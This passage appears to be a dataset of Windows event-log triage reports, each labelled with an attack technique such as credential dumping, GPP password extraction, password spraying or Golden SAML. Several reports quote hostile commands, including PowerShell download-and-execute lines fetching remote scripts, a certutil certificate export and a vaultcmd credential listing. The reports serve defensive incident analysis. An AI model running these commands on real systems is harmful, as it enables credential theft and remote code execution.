   - This command attempts to copy login data from the Opera browser, which contains potentially sensitive information such as saved passwords. The use of environmental variables and obscure file paths suggests an attempt to hide this activity from casual observation.

2. **Associated Sysmon Events:**
   - Sysmon logs show various executions closely related to the suspicious PowerShell command.
   
3. **Process Creation and Execution Context:**
   - Sysmon Event ID 1 events indicate the creation of processes by an admin account (`SERVER002\\admin_test`) with high integrity level, which might point to elevated privileges.
   - Processes of interest include:
     - `powershell.exe` executing the suspicious PowerShell command.
     - Multiple executions following expected for background processes like `conhost.exe`.

4. **Additional Processes:**
   - Processes such as `wevtutil.exe` and `whoami.exe` were also executed. While these are legitimate Windows utilities, their presence in logs can suggest attempts at determining the environment or altering event logs, potentially for malicious purposes.

#### Indicators of Malicious Activity:

- The PowerShell command copying the ""Login Data"" from the Opera browser is a significant indicator of potential data exfiltration. 

- These activities are performed using a PowerShell script executed from the command line without direct user interaction, likely indicating automation or remote execution potentially orchestrated by malicious software or a threat actor.

- The execution of commands under an `admin_test` user context with high integrity levels suggests that the attacker has administrative rights on the machine, which elevates the risk and potential impact of the activity.

### Assessment

Based on the analysis of the provided logs, there is strong evidence pointing towards malicious intent due to the unauthorized access and potential exfiltration of sensitive data. The covert nature of the file path manipulation also points towards an effort to obfuscate actions.

### Resolution

**Resolution: MALICIOUS**

### Guidance

Immediate actions should include:

1. **Containment:**
   - Isolate the affected system (Server002) from the network to prevent further data loss or lateral movement by the threat actor.

2. **Forensics:**
   - Conduct a comprehensive forensic investigation to understand the full scope and impact of the breach, including examining additional logs and potential persistence mechanisms.
   - Look for IOCs (Indicators of Compromise) across other systems.

3. **Credential Audit:**
   - Review and potentially reset credentials, specifically those related to administrative accounts that might have been compromised.

4. **Remediation:**
   - Apply security patches and review system configurations to strengthen defenses against similar attacks.
   - Consider deploying advanced monitoring solutions to detect and respond to suspicious activities more swiftly in the future.

5. **Legal and Communication:**
   - Consult with legal teams regarding data breach notification requirements.
   - Prepare an internal and external communication plan as needed.

By following these steps, the organization can mitigate the immediate threat and reduce the risk of similar incidents occurring in the future."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list),"### Detailed Analysis of the Logs

#### Security Log Analysis:
The security log contains multiple Event ID 5379 entries, which indicate credential validation attempts with a ""ReturnCode"" of 3221226021. This code translates to ""STATUS_LOGON_FAILURE"" indicating failed logon attempts. These entries are linked to operations involving ""MicrosoftAccount"" and ""WindowsLive"" with a service URI indicating potential attempts to access Microsoft services using these credentials.

These credential validation failures, especially multiple failures in succession, can be indicative of brute force attempts or possibly testing for valid credentials. However, without additional information linking these attempts to potential malicious behavior, they stand as suspicious but not definitively malicious actions.

#### PowerShell Log Analysis:
The PowerShell logs show the execution of command lists involving `appcmd.exe` querying IIS application pool configurations. This could be part of normal administrative activity if the server is a web server. However, the repetitive nature and the PowerShell execution could also suggest script-based automation scripts that are suspicious if these are not typical workflows for the server.

Additionally, the use of encoded or obfuscated command lines (e.g., containing lots of `/@` and `/text:`) can be indicative of attempts to obfuscate processes. However, without additional context, these are categorized more as suspicious rather than conclusively malicious.

#### Sysmon Log Analysis:
Sysmon logs reveal execution of several system-level tools (including `wevtutil.exe`, `hostname.exe`, `whoami.exe`) and PowerShell with high integrity. The execution of `wevtutil.exe`, which can be used to query or modify event logs, raises concerns as it can be used by attackers attempting to clear logs to hide their activity.

Additionally, the presence of `conhost.exe` alongside PowerShell processes and system-level tools suggests potential reflective process injection or stdout/stderr redirection, which could be part of a scripted workflow or a sign of malicious activity. The heavy use of PowerShell with elevated integrity levels (`High`) without clearer intent provided by documented processes can be deemed suspicious.

### Assessment:
1. **Failed Credential Validation Attempts**: Consistent failures may indicate potential bruteforce or unauthorized access attempts, warranting additional scrutiny on whose credentials were involved and the frequency pattern.
   
2. **PowerShell Commands with `appcmd.exe`**: Queries on application pools via PowerShell align with administrative tasks but should be verified against typical usage patterns for this server.
   
3. **Execution of System Utilities (`wevtutil.exe`, `hostname.exe`, `whoami.exe`)**: Potentially indicative of system reconnaissanceactivity, raising the level of caution for potential file system or log manipulation. 

### Resolution: **SUSPICIOUS**

While there are no definitive signs of malicious activity such as known malware signatures or explicit indicators of compromise, the nature of this activity is suspicious. These actions warrant closer inspection of:
- Failed credential attempts to determine their source and legitimacy.
- PowerShell command provenance and execution context, ensuring they correlate with authorized administrative actions.
- Reviewing security policy adherence and any system modifications.

### Guidance on How to Proceed:
1. **Conduct Internal Security Review**: Assess if any authorized admin tasks match the observed PowerShell and security logs.
   
2. **Monitor for Anomalies**: Increase monitoring on the CEO's machine and relevant servers to detect further anomalies.

3. **Audit Credentials**: Check on any unusual spikes in authentication failures, and possibly reset passwords if unauthorized attempts are verified.

4. **Log Integrity Verification**: Validate the integrity of logs, looking for signs of tampering especially after potential `wevtutil.exe` usage.

5. **User Training on Security Best Practices**: Reinforce best practices with users, particularly around credential use and reporting suspicious activities.

Further investigation and correlation with the user’s activities during this time frame should help verify or dismiss the suspicious nature of these activities."
GPP Passwords (Get-GPPPassword),"After analyzing the logs provided, several key findings can be noted:

1. **PowerShell Execution**: The logs display multiple PowerShell execution events:
   - The execution of `powershell.exe` with the command to run a script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\Get-GPPPassword.ps1`. This specific script name, `Get-GPPPassword.ps1`, is highly suspicious because it is widely known to be used for extracting Group Policy Preferences passwords that can potentially include administrative passwords saved in Group Policy. This type of activity indicates that a user, likely with administrator level access (`admin_test`), attempted or successfully executed a script to extract passwords.

2. **Process Launch Patterns**: Multiple instances of processes such as `wevtutil.exe` and `conhost.exe` were executed within a very short period, seemingly orchestrated through PowerShell. The processes:
   - `wevtutil.exe` is known for its interaction with Windows Event Logs, possibly aiming at covering tracks by clearing logs or querying them.
   - These sequences of processes running almost simultaneously, and accompanying the suspicious PowerShell execution, point towards automated/scripted behavior possibly associated with malicious intents.

3. **Elevated Token Usage**: The security logs indicate usage of highly privileged tokens (`SeDebugPrivilege`, among others) which may point towards privilege escalation attempts or malicious scripts executing with elevated privileges.

4. **Credential Access Events**: Events such as `EventID 4798` and failed credential access attempts (`EventID 5379`) are logged. These reinforce the likelihood that credentials are being enumerated or targeted, possibly for lateral movement within the network.

5. **Background Updates**: There are entries for `MicrosoftEdgeUpdate`, but they appear legitimate for maintaining the Microsoft Edge browser, run by `NT AUTHORITY\SYSTEM` and part of regular system maintenance tasks.

Given the occurrence of these events, particularly the execution of a password harvesting script, it ceases to be normal administrative behavior. This suggests suspicious activity with strong indicators of potential compromise.

**Recommendation**:
- Immediately isolate the affected host to prevent further potential credential exposure or lateral movement.
- Conduct a deeper forensic analysis on `SERVER002` aimed at confirming what data the `Get-GPPPassword.ps1` script accessed or if any credentials were extracted.
- Review and enhance monitoring systems to detect and alert similar PowerShell activity across the environment.
- Train users on the risks of executing scripts with high privileges, and enforce best practices for credential management.

**Resolution**: MALICIOUS - Logs contain evidence of potentially harmful script execution aimed at accessing sensitive information, suggesting a compromise or attempted compromise of the system security. This activity is consistent with known malicious tactics."
Export Root Certificate with Export-PFXCertificate,"Upon analyzing the provided Windows event logs, certain activities stand out as being potentially suspicious or anomalous:

### Windows System and Security Logs

1. **Time Change Events**: 
   - There are multiple time change events (`EventID 4616`) all occurring within a short time frame. While time synchronization services frequently adjust time, consistent and frequent changes might indicate tampering or attempts to obscure activity timestamps.

### Windows PowerShell Logs

2. **PowerShell Activity**: 
   - A PowerShell script is executed, creating a self-signed certificate (`New-SelfSignedCertificate`) and exporting it to a `.pfx` file using `Export-PfxCertificate`. This activity is not typical for routine operations and might indicate an attempt to establish unauthorized communication or encryption.
   - The PowerShell command line involves converting a plain text password to a secure string, which could indicate preparation for sensitive operations.

### Sysmon Logs

3. **Process Executions**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are observed with `admin_test` user context. Usage of `wevtutil.exe` is common for managing event logs but could be leveraged to clear logs as part of anti-forensic efforts.
   - A sequence of `whoami.exe` execution seems routine for user context verification, yet it's in conjunction with other suspicious activities.
   - The execution of `powershell.exe` relates back to the earlier suspicious PowerShell operations.

### Application and Edge Update Logs

4. **Edge Update Executions**: 
   - Numerous instances of `MicrosoftEdgeUpdate.exe` and the related setup and registration commands are present. While Edge update activities can occur frequently, the concentration of these events could warrant investigation if not aligned with scheduled updates, especially since system manipulation like registry modification was present in the logs.

### Assessment

- **Suspicious PowerShell Activity**: The use of PowerShell to create and export certificates and the conversion of plain text passwords are indicative of preparative actions for potentially malicious activities.
  
- **Repeated Process Executions**: While some processes like `wevtutil.exe`, `whoami.exe`, and `EdgeUpdate.exe` are benign individually, their combination and context make them worthy of further scrutiny. They could represent attempts to cover tracks (log manipulation) or prepare the system for persistence or data exfiltration.

### Final Resolution

- **Resolution: SUSPICIOUS**
  - The activities do not conclusively confirm malicious intent (such as definite malware signatures or unauthorized breaches), but they display characteristics that are atypical for regular system operations.
  - It is essential to conduct a deeper investigation, including reviewing system configurations, network traffic, and communication with external hosts to validate if any unauthorized activities have been conducted.

### Recommendation

- **Conduct further investigation on the PowerShell activities**, particularly the certificate-related actions, to ensure they align with organizational needs.
- **Verify the legitimacy** of time changes and whether they align with expected system updates or configurations.
- **Examine the activity of `admin_test` user** for any other suspicious changes or actions taken in the system context.
- **Conduct vulnerability and integrity checks** on `Server002` to ensure no unauthorized changes have occurred following these activities."
Dump Kerberos Tickets from LSA using dumper.ps1,"Based on the logs provided, I have analyzed the entries to determine if there are any indicators of malicious activity or compromise:

### Security Log
1. **Event ID 4616**: Indicates time change events. Multiple entries show slight discrepancies between `PreviousTime` and `NewTime`. Such changes may raise suspicion, but they could occur due to system updates or time synchronization. 
2. **Event ID 4634**: Signifies a logoff event by user `admin_test`. 
3. **Event ID 4672**: Privilege assignment events to `admin_test`, including high privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These are typical administrative actions but could be abused if not expected.
4. **Event ID 4624**: Logon event for `admin_test` with `LogonType` 3, indicating a network logon. This could be a benign remote access, but should be verified if unexpected.

### Windows PowerShell Log
There are multiple instances of PowerShell execution with the command: 
```
powershell.exe & {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/script/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/script.ps1')}
```
Downloading and executing scripts from external sources is highly suspicious and often indicative of malicious activity, especially if the script's content is unknown.

### Sysmon Log
1. **Process Creation**: Processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `HOSTNAME.EXE` were executed by `admin_test`. While these processes are typical system utilities, their context of execution should be verified for validity.
2. **PowerShell Execution**: Directly correlates with the PowerShell log showing the download and execution of a potentially malicious script.

### Conclusion
The notable aspects of these logs are the repeated execution of PowerShell scripts downloading from an external source, along with elevated privilege usage by the `admin_test` account. Such actions are often used in attack patterns for downloading and executing malicious payloads. The download of scripts over the internet without prior scrutiny is highly suspicious.

### Final Assessment: MALICIOUS
The presence of script execution directly from external sources especially from Github using PowerShell is a clear indicator of potentially malicious activity and should be addressed immediately. The actions taken on this host should be viewed as compromise until confirmed otherwise.

### Recommendations:
1. **Immediate Isolation**: Remove the affected system from the network to prevent further spread or exfiltration of data.
2. **Scan for Malware**: Use up-to-date antivirus and endpoint detection and response (EDR) solutions to scan for and remove any known malware.
3. **Review and Revoke Unnecessary Privileges**: Investigate `admin_test's` activity and revoke any unnecessary privileges; verify if this user account was compromised.
4. **Incident Response**: Initiate a full incident response process including deeper forensic analysis to determine the extent of the compromise.
5. **Monitor Network Traffic**: Analyze network logs for any suspicious communications that may have occurred due to this incident."
Password spray all Azure AD users with a single password,"Upon analyzing the provided Windows event logs, there are several indicators that suggest malicious activity is occurring:

1. **Suspicious PowerShell Activity**:
   - Multiple Sysmon events show the execution of `powershell.exe` and `wevtutil.exe` under the `SERVER002\admin_test` user. The command line used by PowerShell contains a script that is conducting a password spraying attack against Azure Active Directory (AzureAD):
     - It attempts to use a common password ""P@ssw0rd!"" on multiple Azure account usernames derived from `Get-AzureADUser`.
     - Such a script is indicative of a brute force attack to discover valid credentials, which is a significant indicator of compromise.

2. **Use of System Utilities in Sequence**:
   - The execution of `wevtutil.exe` is noted multiple times. This tool is commonly used to query Windows event logs, and its execution alongside PowerShell scripts can be a sign of an attempt to clear event logs or gather specific events related to the attacker’s activities.
   - To further add to this suspicion, `conhost.exe` is executed multiple times, which often accompanies console applications like PowerShell. However, the presence of `conhost.exe` itself isn't inherently suspicious without the context of the command line arguments being executed by its parent process, PowerShell.

3. **High-Integrity Level Execution**:
   - The PowerShell scripts run with a ""High"" integrity level, indicating that they are executing with elevated privileges, which would allow them to perform critical actions on the system.

4. **Persistence Indicators**:
   - The presence of `wsmprovhost.exe` as the parent process to some of the malicious activities indicates that Windows Remote Management (WinRM) might be in use, potentially allowing remote command execution and persistence.

5. **Security Log Event 4799**:
   - The security log shows activity involving the temporary Edge update executable (`EDGEMITMP_8E28E.tmp\setup.exe`). This action might be benign as it aligns with Edge’s update process. However, the concurrent activity with potentially malicious PowerShell usage raises concerns about potential misuse or the attacker hiding activities within legitimate ones.

**Risk Assessment and Resolution**:
Given the context and the identified indicators, this situation should be considered **MALICIOUS**. The execution of a PowerShell-based password spraying attack, combined with the use of system utilities like `wevtutil.exe`, signifies a significant risk of compromise. Steps should be immediately taken to isolate the affected host, investigate the extent of the breach, and assess any potential exposure or loss of data due to such actions.

**Guidance**:
- Isolate the compromised system from the network to prevent further actions by the attacker.
- Perform a thorough investigation of the compromised account activities and identify signs of lateral movement.
- Reset credentials for impacted accounts, especially those with administrative privileges.
- Review and apply stricter access controls and monitoring on sensitive systems and accounts.
- Check for any persistence mechanisms introduced by the attacker, such as scheduled tasks, startup entries, or services installed that could allow them to return.
- Conduct a full incident analysis post-incident to understand the attack vector and date of compromise. Use this information to inform future security improvements and user awareness."
Access Saved Credentials via VaultCmd,"Upon analyzing the provided Windows event logs, several points of interest suggest potential malicious activity. Here's a breakdown of the suspicious elements and potential implications:

1. **Time Synchronization Change Alerts**:
   The event logs display multiple changes in the system time, notably event ID 4616 from the Security log and event ID 1 from the System log. Frequent and unexplained time changes can be indicative of attempts to manipulate file timestamps, perhaps to cover any unauthorized activities. Event ID 35 details the time synchronization with an external time source, which might not be inherently suspicious but could be used to infer contextual anomaly if associated with illicit activities.

2. **Privileged Account Usage**:
   The user account `admin_test` is seen executing several privileged actions. Notably, event ID 4672 in the Security log shows the granting of numerous high-level privileges, including `SeDebugPrivilege`, which is often leveraged in exploitation scenarios for privilege escalation or for conducting reconnaissance on the host system.

3. **Use of Administrative Commands**:
   The Sysmon logs reveal the execution of `whoami.exe`, `hostname.exe`, and `vaultcmd.exe`. While seemingly benign, the context is crucial:
   - **whoami.exe**: Used to gather information about the current security context, potentially for reconnaissance.
   - **vaultcmd.exe**: Was executed with the `/listcreds` option, which could be used to list stored credentials. This action might indicate a credential access attempt, often seen in lateral movement stages of an attack.
   
4. **NTLM Authentication Events**:
   The logs display NTLM authentication attempts from the workstation `DESKTOP-3HL5B2P` using the `admin_test` account (event ID 4624 in the Security log). While this could be legitimate, NTLM challenges can also be part of Pass-the-Hash or other lateral movement techniques, especially when coupled with high-privilege usage events.

5. **Execution of Service Management Tools**:
   The consistent invocation of `wevtutil.exe` and `svchost.exe` processes in several Sysmon log entries could hint at enumeration or manipulation of event logs, especially if correlated with evidence of time changes and credential access.

6. **Execution of Potentially Malicious `cmd.exe` Commands**:
   A command line such as `""cmd.exe"" /c vaultcmd /listcreds:""Windows Credentials""` indicates direct intention to retrieve credential information from the system vault, which aligns with threat actor techniques for gathering stored credentials.

**Assessment**:
This host exhibits several red flags, primarily around the usage of elevated privileges, suspicious command-line operations attempting to access system credentials, and time manipulation. The combined evidence supports the theory of ongoing malicious actions, including reconnaissance and credential theft attempts.

**Resolution**: MALICIOUS

**Guidance**:
Immediate actions should be taken to:
- Isolate the affected machine to prevent further lateral movement or data exfiltration.
- Conduct a comprehensive audit of accounts, particularly `admin_test`, to identify any unauthorized access or anomalous permissions.
- Review network activity correlated with timestamps of these events for possible data exfiltration or command-and-control communication.
- Investigate potential lateral movement paths initiated from this host.
- Check for similar anomalies or repeated patterns on connected systems that could indicate a broader compromise."
CertUtil ExportPFX,"Based on the log analysis provided, let's break down the key findings:

### Indicators of Potential Malicious Activity:

1. **Suspicious PowerShell Execution:**
   - Multiple events indicate the execution of PowerShell with a suspicious command line: 
     ```
     powershell.exe & {IEX (IWR 'https://github.com/file/file-file/raw/master/files/data.004/src/RemoteCertTrust.ps1' -UseBasicParsing) , certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\temp\file.pfx}
     ```
   - `IEX (Invoke-Expression)` and `IWR (Invoke-WebRequest)` are often used in PowerShell-based attacks to execute code retrieved from the internet.
   - The use of `certutil.exe` to export a certificate could indicate an attempt to exfiltrate credentials.

2. **Privilege Escalation and Unusual Admin Activity:**
   - There are multiple logon events (EventID 4624) and privilege escalation events (EventID 4672) related to the user `SERVER002\admin_test`.
   - The account was granted several privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are not commonly required for standard operations and are often abused in attacks.

3. **Time Discrepancies:**
   - Security log entries indicate time-related activities where the system time was adjusted backward. Tampering with system time could be used to cover tracks or alter logging data.

4. **Unusual Use of System Utilities:**
   - The execution of system utilities like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `certutil.exe` were all initiated under the context of `SERVER002\admin_test`, suggesting potential enumeration or reconnaissance activity.

### Assessment and Resolution:

- **Malicious Activity:** The PowerShell command with internet retrieval and certificate export signifies a high likelihood of data exfiltration attempt.
- **Privilege Abuse:** The escalation of privileges and use of admin capabilities by `admin_test` without an apparent legitimate purpose raises suspicions.
- **Time Manipulation:** Altering system time is a tactic to evade detection in logs.

Given these findings, the resolution is **MALICIOUS**:

### Guidance:

1. **Immediate Containment:**
   - Isolate the affected host (Server002) from the network to prevent further data exfiltration.
   - Change credentials for any accounts used or affected.
   
2. **Investigation and Remediation:**
   - Conduct a thorough investigation to determine the source of the PowerShell script and any possible breaches or further compromised systems.
   - Check logs from adjacent systems for similar activities.
   - Re-examine security controls and configurations, especially around privilege management.
   
3. **Monitoring and Alerting:**
   - Set up monitors for unexpected command-line arguments in PowerShell execution, especially involving `IEX` and `certutil.exe`.
   - Enhance real-time alerting for account privilege changes.

This incident likely indicates attempted or successful malicious activity involving credential access and potential lateral movement within the network based on the patterns observed."
Create Volume Shadow Copy with WMI,"Based on the provided Sysmon, Security, and System event logs, the analysis is as follows:

### Sysmon Logs Analysis:
1. **Command Execution**: Multiple instances of command executions using `cmd.exe` while querying the registry to find `ProductType` using `reg.exe` and `findstr.exe`. This command might be typical, but its frequent use in a short period warrants closer inspection.

2. **Creating Shadow Copy**: Execution of commands to create a volume shadow copy using `wmic` and `vssvc.exe` is observed. While this action could be legitimate for backup purposes, it is commonly abused in ransomware attacks to create backups they can delete or encrypt for increased leverage.

3. **Using `wevtutil.exe`**: `wevtutil.exe` was run several times, which is unusual unless used for specific purposes like clearing event logs, a common tactic to cover tracks.

4. **File Operations**: Instances of `HOSTNAME.EXE` and `whoami.exe` being executed, which could be part of environment reconnaissance.

5. **High Integrity Level**: All processes are running with high integrity levels, suggesting elevated privileges, which aligns with the admin credentials (`SERVER002\\admin_test`).

### Security Logs Analysis:
1. **Successful Logon Events (4624)**: The logon session for `admin_test` appears legitimate, though the context around the use of NTLM indicates a potential Pass-the-Hash attack vector because `NTLM` is less secure and vulnerable.

2. **Privileges Granted (4672)**: SYSTEM account gained multiple high-level privileges, which is typical but noteworthy in this context due to the timing and activities observed.

3. **Time Change Event (4616)**: Time on the server was altered, which is unusual and could be an attempt to manipulate logs or attempt something chronological based.

### System Logs Analysis:
1. **Volume Shadow Copy Operations**: Confirmed with UID changes and likely legitimate system operations, but could be seen as a precursor to malicious activities.

2. **Time Manipulation**: The Kernel-General log indicates changes in time settings, which is almost always suspicious.

### Conclusion

- **Suspicious Activity**: The sequence of operations, including registry queries, shadow copy creation, and security principal operations, amidst elevated privileges, suggests suspicious activity.
  
- **Potential Ransomware Indicators**: The use of volume shadow copies combined with potentially obfuscating actions, such as time manipulation, aligns with tactics used in ransomware operations.

- **Recommendation**: Isolate the host to prevent any potential spread of ransomware or unauthorized access. Conduct a forensic investigation to confirm any tampering or unauthorized access. Review all user privileges and modify policies to prevent unnecessary shadow copies and ensure all activities are monitored closely.

Finalize this with the resolution:
- **Resolution**: SUSPICIOUS - The detected activities are atypical and warrant further investigation to rule out a compromise or malicious intent."
BrowserStealer (Chrome - Firefox - Microsoft Edge),"Based on the analysis of the provided logs, several indicators point towards potential malicious activity. Here are the key observations:

1. **Unusual PowerShell Execution**:
   - Repeated instances of `powershell.exe` are executed with command lines involving file manipulations like `Copy-Item`, `Remove-Item`, and launching `BrowserCollector.exe`. These actions pertain to sensitive files like `key4.db` and `logins.json`, which are typically associated with browser stored passwords and credentials.
   - The execution of PowerShell in such a manner, particularly targeting user's AppData directories associated with web browsers, is often indicative of data exfiltration techniques typically used by malware.

2. **Process Executions**:
   - The processes `wevtutil.exe` and `svchost.exe` have been executed consecutively. While these are legitimate Windows executables, their usage in a sequence, particularly involving PowerShell, can suggest log modification or event log clearing activities, often used to cover tracks after executing malicious operations.
   - The command line and execution path, indicating file copying and removal followed by the execution of a potential reconnaissance tool (`BrowserCollector.exe`), is not typical of standard user behavior.

3. **Integrity Level**:
   - Several processes, including PowerShell, are running with a high integrity level, indicating that these actions are being performed with elevated privileges. This could suggest privilege escalation, a common trait in attack scenarios.

4. **Security Product State**:
   - The logs indicate that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`). However, the malicious activity observed suggests potential gaps in detection or evasion by the malicious actor.

5. **Unusual Command Line Arguments**:
   - The execution of `conhost.exe` with the `-ForceV1` flag and paths indicating embedding or parent-child execution relations further reinforces the likelihood of obfuscation or hiding of malicious activities.

**Conclusion and Assessment**:
The logs exhibit behaviors typical of malicious activities, including credential harvesting, potential log manipulation, and command execution with elevated privileges. These activities are indicative of a compromise. The detailed execution of scripts and commands that target sensitive browser data strongly points to malicious intent.

**Recommendation**:
Immediate containment and response procedures should be initiated. This includes isolating the affected host, conducting a thorough forensic investigation to determine the extent of the compromise, and confirming any data exfiltration. Finally, review and bolster security controls to mitigate similar threats in the future.

**Resolution**: MALICIOUS"
Offline Credential Theft With Mimikatz,"## Analysis of Windows Event Logs

### Observations:
1. **System Log**:
   - There is a benign update event from the Microsoft-Windows-WindowsUpdateClient indicating a security intelligence update for Microsoft Defender Antivirus. This is standard behavior for Windows systems for maintaining security definitions.

2. **Sysmon Log**:
   - **EventID 1**: A command execution event where `cmd.exe` was run from `powershell.exe`. The command executed checks for the existence of an `lsass.DMP` file in the `%tmp%` directory:
     - Command: `""C:\\Windows\\system32\\cmd.exe"" /c ""if not exist %tmp%\\lsass.DMP (exit /b 1)""`
     - This can indicate reconnaissance or an attempt to dump LSASS memory, which is often associated with credential theft.
   - **EventID 5**: Multiple instances of processes relating to `wevtutil.exe` and `conhost.exe` running under `SERVER002\\admin_test`:
     - `wevtutil.exe` is a legitimate Windows utility used to manage Windows Event logs. However, its execution without context or purpose, especially in combination with other indicators, can be suspicious as it might be used to clear event logs in nefarious activities.
   - **EventID 1** and **5**: Execution of utilities such as `HOSTNAME.EXE` and `whoami.exe`:
     - Although these commands are standard utilities used to gather system information, they can also be used for reconnaissance by adversaries trying to enumerate information about the compromised system.

### Assessment:
- The sequence of commands and process activities being executed raises some red flags. The combination of potentially dumping LSASS with `cmd.exe`, followed by the execution of `whoami.exe`, `HOSTNAME.EXE`, and the frequent use of `wevtutil.exe` suggests possible malicious intent rather than simple debugging or system administration tasks.
  
- The use of PowerShell to pivot into `cmd.exe` with command-line operations that check for LSASS dump presence is particularly concerning, as this might indicate preparation for credential harvesting. Coupled with looking up the hostname and current user, these activities indicate reconnaissance following a compromise.

### Threats/Risks Identified:
- **Credential Harvesting**: The use of commands that point towards LSASS memory interaction.
- **Reconnaissance**: Enumeration commands like `whoami.exe` and `HOSTNAME.EXE` being executed may suggest mapping of the environment by an attacker.
- **Event Log Manipulation**: Potential use of `wevtutil.exe` to clear or manipulate event logs, which can be an attempt to conceal malicious activities.

### Conclusion:
The combination of suspicious process executions, command-line checks for sensitive files like LSASS dumps, and frequent use of utilities often associated with reconnaissance or clean-up suggest a potential compromise.

### Recommended Course of Action:
- Conduct further in-depth investigation focusing on:
  - Potential unauthorized access to credential-rich environments (e.g., LSASS).
  - Verify if the `wevtutil.exe` usage correlates with any known system maintenance activities or if it denotes malicious log clearing.
  - Monitor any additional similar behavior across other systems or the network for widespread activity.

### Resolution:
- **Resolution**: **SUSPICIOUS**
- Further investigation is warranted to determine the full context and intent behind these activities. The potential for malicious activity exists, and steps to contain and mitigate should be considered if further investigations corroborate these findings."
Request for service tickets,"Upon analyzing the provided Windows event logs, several activities stand out as suspicious and potentially indicative of malicious activity:

1. **Unusual PowerShell Activity**: 
   - Throughout the logs, there is evidence of PowerShell being executed with a command that retrieves and attempts to execute a script from an external URL: 
     ```
     ""powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, iex(iwr https://raw.githubusercontent.com/scriptProject/script/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-script.ps1 -UseBasicParsing), Invoke-script | fl}""
     ```
   - The use of `Invoke-Expression` (`iex`) with `Invoke-WebRequest` (`iwr`) to execute a remote script is a common indicator of a script attempting to download and execute potentially malicious code.

2. **Multiple Wevtutil and Conhost Instances**:
   - There are several instances of `wevtutil.exe` and `conhost.exe` being executed in quick succession. While `wevtutil` can be used for legitimate purposes like managing event logs, its frequent execution alongside `conhost.exe`, which is often used to host command line interfaces, may suggest attempts to hide or manipulate logs.

3. **High Integrity Level Execution**:
   - The PowerShell scripts seem to be running with a High Integrity Level, which indicates they have high privileges. This could be leveraged to perform privilege escalation or system modifications.

4. **Launching of Common Discovery Commands**:
   - Executing commands like `whoami.exe` and `hostname.exe`, while common for system administration, can also be part of discovery tactics in a compromise to gather system information.

5. **Process Parentage**:
   - The `wsmprovhost.exe` process, typically associated with Windows Remote Management, seems to be the parent process for several potentially suspicious commands. Anomalies in process parentage can sometimes indicate a compromise or abused service to execute scripts remotely.

6. **No Legitimate Script Names or Paths**:
   - The PowerShell logs do not indicate legitimate script paths or names, but instead contain direct command-line strings executed through PowerShell, further hinting at manual or automated scripting attempts for unauthorized operations.

Considering the data and the signs pointing towards potential script-based exploitation or reconnaissance, the logs should be seen as:
   
**Resolution: MALICIOUS**

### Guidance:
1. **Immediate Response**: 
   - Contain and isolate the affected machine immediately to prevent lateral movement within the network.
   - Reset credentials for any accounts that were active during the suspicious activity.

2. **Further Investigation**:
   - Review network logs for any outbound connections to suspicious IPs or domains linked to the URLs used.
   - Analyze other systems in the network for similar activities or indicators of compromise.

3. **System Auditing**:
   - Conduct a full audit of executed scripts, scheduled tasks, and accounts with elevated privileges.
   - Check for unauthorized changes to security configurations and installed software.

4. **Remediation**:
   - Remove any unauthorized scripts or files.
   - Apply latest security patches and ensure PowerShell's logging is set to monitor for remote executions.

5. **Strengthening Security**:
   - Implement strict access controls and use zero-trust network architecture principles.
   - Enable Application Control policies to prevent unauthorized script execution.

"
Golden SAML,"**Analysis of the Logs:**

Upon examining the logs, several details point towards potentially malicious activity, particularly in the PowerShell logs.

1. **PowerShell Activity**: The PowerShell events indicate the use of a command that imports a module named AADInternals, which is commonly associated with the manipulation of Azure Active Directory (AAD) and ADFS (Active Directory Federation Services). This module can be used for legitimate administrative tasks, but it is also known for capabilities like creating a ""Golden SAML"" attack, a technique used to impersonate users for unauthorized access.

2. **Command-Line Execution**: The PowerShell command executed includes the generation of a SAML token using the `New-AADIntSAMLToken` cmdlet and an ADFS token signing certificate (`ADFS_signing.pfx`). The operation appears to aim at creating a token to obtain an access token for the AAD Graph API. This could be considered suspicious, especially if this action hasn't been approved by the IT security team or if the user executing it doesn't have a valid reason for such operations.

3. **User Account**: The operations are being executed under a user account `SERVER002\\admin_test`, which is indicative of an administrator or test account possibly being used for these actions. The presence of a test account executing high-privilege operations can be a red flag, depending on the organization's policies and usage patterns.

4. **Windows Sysmon Logs**: The Sysmon logs show processes like `wevtutil.exe`, `whoami.exe`, `hostname.exe`, and `powershell.exe` executed in close sequence. The presence of multiple utility commands (`whoami`, `hostname`) alongside suspicious scripts is often associated with reconnaissance activities by attackers.

5. **Integrity Level**: The PowerShell instances and the utility processes are running at a high integrity level, suggesting these commands had administrative privileges, further elevating the potential risk if these actions are unauthorized.

**Assessment of the Situation:**

- **Threat Level**: HIGH. The activity seen in the logs indicates the use of potentially dangerous tools with privileged access, aligned with known attack techniques. If unauthorized, this activity could lead to severe security breaches such as domain escalation or unauthorized access to cloud resources.

- **Risks Identified**: Possible creation of forged tokens for gaining illegal access, potential lateral movement within the network, or data exfiltration if these tokens are used for accessing sensitive resources.

**Guidance on How to Proceed:**

1. **Immediate Investigation**: Verify the legitimacy of the `admin_test` account and assess the necessity and authorization for using the AADInternals module. Contact the individual responsible for the operations logged if possible.

2. **Containment Actions**: If unauthorized, isolate the affected system (`Server002`) immediately to prevent further potential lateral movement or data breaches.

3. **Assess and Audit**: Check audit logs for any other unexpected or unauthorized behaviors, especially related to account logins, authentications, and access to AAD-related resources.

4. **Security Enhancement**: Implement tighter controls around PowerShell script execution, especially those importing sensitive modules. Consider using Constrained PowerShell end-to-end or JEA (Just Enough Administration) for privileged operations.

5. **Logging and Monitoring**: Increase logging depth on critical systems and enforce more robust monitoring to catch early indicators of such activities in the future.

**Resolution: MALICIOUS** - Given the use of tools and techniques pertinent to token forgery and the proceeding utility actions, this behavior is determined to be malicious assuming no legitimate administrative context validated post-investigation."
